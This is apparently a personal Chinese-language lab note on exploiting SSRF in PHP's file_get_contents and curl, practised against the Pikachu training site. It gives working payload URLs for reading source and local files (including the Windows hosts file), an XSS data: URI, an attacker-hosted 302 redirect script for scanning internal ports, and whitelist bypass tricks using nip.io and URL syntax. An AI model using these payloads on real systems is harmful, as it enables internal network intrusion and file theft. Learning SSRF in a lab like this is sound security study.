# SSRF 基礎




## file_get_contents

```
file_get_contents()的Gopher协议不能进行URLencode；
file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；
file_get_contents()支持php://input协议；
file_get_contents()預設會302跳轉
file_get_contents()不支持 dict
file_get_contents()支持 php://filter
file_get_contents()支持 file:///

```

### 常見獲取本地文件:
```
//獲取code
http://pika/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=./ssrf_fgc.php

//獲取本地文件
http://pika/vul/ssrf/ssrf_fgc.php?file=file:///D:/phpstudy_pro/WWW/pika/vul/ssrf/111.txt


```



### 幾種XSS利用
```

//get型態利用簡單
http://pika/vul/ssrf/ssrf_fgc.php?file=data:text/plain;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4


-----------------------------------------------------------

//利用比較複雜(較沒用)

php://input

body放入
<script>alert("xss")</script>
-----------------------------------------------------------

直接外網放個xss網頁，更快!!!。



```



### 我實際測試 gopher 拿不到banner，我懷疑file_get_contents到底有沒有支持gopher?
```
gopher://pika:80/xxx
```


### 302跳轉繞過

假設對方黑名單127.0.0.1，或是過濾特殊字元。
目的:不讓讀取本地資源

302.php
```php=


<?php

header("Location: http://127.0.0.1:80");

header("Location: http://pika/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=./ssrf_fgc.php");


?>

```

### nip.io 繞過

假設對方白名單 pika.com 

```
//最後跳去127.0.0.1
http://pika.com.app.127.0.0.1.nip.io/
```
不過如此一來，我們就無法探測端口號和其他IP。



### 所以 nip.io 加上 302

假設11.22.33.44 是 hacker的IP

11.22.33.44放一個 index.php用來參術控制 協議 IP 端口 數據。 
```
<?php
$ip = $_GET['ip'];
$port = $_GET['port'];
$scheme = $_GET['s'];
$data = $_GET['data'];
header("Location: $scheme://$ip:$port/$data");
?>

```

最後會跳到192.168.x.x網段掃描。
```
http://pika.com.app.11.22.33.44.nip.io?s=http&ip=192.168.0.1&port=80

http://pika.com.app.11.22.33.44.nip.io?s=http&ip=192.168.0.2&port=80

http://pika.com.app.11.22.33.44.nip.io?s=http&ip=192.168.0.2&port=8080

```

注意:經過實測 302 header 不能跳轉file協議，而且file_get_content 能用的協議也不多。


## curl


### 注意

```
因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转

curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；

```



### 常用協議

 三種常用
```
gopher

file

dict

```

一樣可以用302跳轉方式，file協議 用302我實測也失敗。




```
//直接讀取當前路徑文件失敗，感覺curl 需要絕對的URL
http://pika/vul/ssrf/ssrf_curl.php?url=ssrf_curl.php

//file 成功
http://pika/vul/ssrf/ssrf_curl.php?url=file:///D:/phpstudy_pro/WWW/pika/vul/ssrf/111.txt

```

### dict 探測端口或IP

dict协议探测：SSRF常配合DICT协议探测内网端口，但不是所有的端口都可以被探测，一般只能探测出一些带 TCP 回显的端口

此时我们可以利用SSRF漏洞先对内网做IP+端口的扫描。端口的开放、关闭状态不同，响应的返回时间也会有差别，据此就可以判断端口的开放状态。

```
//mysql 有banner
dict://127.0.0.1:3306


//mariaDB 沒有banner 
dict://192.168.43.84:3306

//有banner
dict://127.0.0.1:80
dict://192.168.43.84:80



```




### Gopher 来构造GET/POST包攻击应用。

我這邊就不放應用，改天找個靶場玩玩，大多都是搞redis get shell



## 定位IP 網段:


### 掃描

```
以下是IPv4私有内部网段：

1. **10.0.0.0 到 10.255.255.255（10.0.0.0/8）**
   - 这是一个非常大的私有地址范围，可以容纳约16,777,216个IP地址。

2. **172.16.0.0 到 172.31.255.255（172.16.0.0/12）**
   - 这个地址范围也是为私有网络保留的，包含16个连续的/20子网，每个子网包含1,048,576个IP地址。

3. **192.168.0.0 到 192.168.255.255（192.168.0.0/16）**
   - 这是最常用的私有内部网段，它提供了256个连续的/24子网，每个子网包含256个IP地址。
```


### 獲取敏感文件，或是其他文件找找看，或是社工。

hosts文件
```
http://pika/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/System32/drivers/etc/hosts

```

爆破web目錄，或是web文件，本地文件，做為資訊蒐集。










### 其他繞過

方式還有很多種，例如dns rebinding

白名單www.google.com 最後跳到FB
```
http://www.google.com@www.facebook.com
```

如果必須包含 www.google.com

```
http://www.facebook.com#www.google.com
```





參考:

```
//很屌
https://www.t00ls.com/articles-51972.html

https://www.cnblogs.com/-chenxs/p/11749367.html

https://atmujie.github.io/2021/09/22/SSRF/

https://www.v0n.top/2020/03/01/SSRF%E5%AD%A6%E4%B9%A0/

```















